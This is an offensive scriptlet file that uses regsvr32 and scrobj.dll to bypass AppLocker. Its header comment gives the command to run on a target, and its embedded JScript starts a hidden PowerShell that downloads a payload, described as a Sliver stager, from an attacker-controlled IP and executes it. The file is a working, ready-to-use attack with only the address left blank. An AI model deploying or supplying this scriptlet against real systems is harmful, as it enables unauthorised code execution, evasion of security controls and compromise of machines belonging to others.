<?XML version="1.0"?>
<!--
  AppLocker bypass via regsvr32.exe scriptlet.
  Host this file on your HTTP server, then run on the target:
    regsvr32.exe /s /n /u /i:http://<IP>/regsvr32.sct scrobj.dll
  Edit the PowerShell command below before use.
-->
<scriptlet>
  <registration
    progid="UpdateProvider"
    classid="{A111F1A0-1111-1111-1111-111111111111}">
    <script language="JScript">
      <![CDATA[
        // ── Payload — download + run your Sliver stager / PowerShell payload ──
        var cmd = "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://<IP>/run.ps1')\"";
        new ActiveXObject("WScript.Shell").Run(cmd, 0, false);
      ]]>
    </script>
  </registration>
</scriptlet>
